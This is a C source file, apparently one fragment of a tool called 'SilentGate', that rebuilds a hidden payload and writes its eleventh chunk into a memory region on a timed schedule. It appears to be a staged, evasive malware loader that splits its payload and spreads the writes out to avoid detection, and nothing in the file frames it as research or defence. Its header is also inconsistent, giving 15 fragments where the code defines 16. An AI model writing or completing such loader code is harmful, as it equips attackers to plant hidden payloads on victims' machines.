/*
 * SilentGate Fragment 11/15
 * Offset: 83699 bytes  Size: 7609 bytes
 * Schedule: t=788ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   11
#define N_FRAGMENTS   16
#define PAYLOAD_SIZE  121746
#define CHUNK_OFFSET  83699
#define CHUNK_SIZE    7609
#define SLEEP_NEXT_MS 788

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);


/* Fragment 11: Write chunk 11 */
void sg_execute_fragment_11(PVOID mem) {
    if (!mem) return;
    printf("[FRAG 11] Writing chunk at t=788ms\n");

    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    printf("[FRAG 11] Chunk 11 written at offset %d\n", CHUNK_OFFSET);
    Sleep(SLEEP_NEXT_MS);
}
